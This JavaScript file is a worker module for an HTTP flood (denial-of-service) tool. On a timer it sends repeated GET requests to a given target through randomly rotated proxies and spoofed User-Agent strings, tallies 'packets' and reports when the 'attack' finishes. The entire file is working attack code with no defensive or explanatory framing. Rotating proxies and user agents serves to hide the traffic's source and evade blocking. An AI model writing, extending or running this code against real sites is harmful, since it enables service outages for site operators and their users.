import axios from "axios";
import { parentPort, workerData } from "worker_threads";

const startAttack = () => {
  const { target, proxies, userAgents, duration, packetDelay } = workerData;

  let fixedTarget = target.startsWith("http") ? target : `http://${target}`;
  let totalPackets = 0;
  const startTime = Date.now();

  const sendRequest = async (proxy, userAgent) => {
    try {
      await axios.get(fixedTarget, {
        proxy: { host: proxy.host, port: proxy.port },
        headers: { "User-Agent": userAgent },
        timeout: 2000,
      });
      totalPackets++;
      parentPort.postMessage({
        log: `✅ Request successful from ${proxy.host}:${proxy.port} to ${fixedTarget}`,
        totalPackets,
      });
    } catch (error) {
      parentPort.postMessage({
        log: `❌ Request failed from ${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
        totalPackets,
      });
    }
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    sendRequest(proxy, userAgent);
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
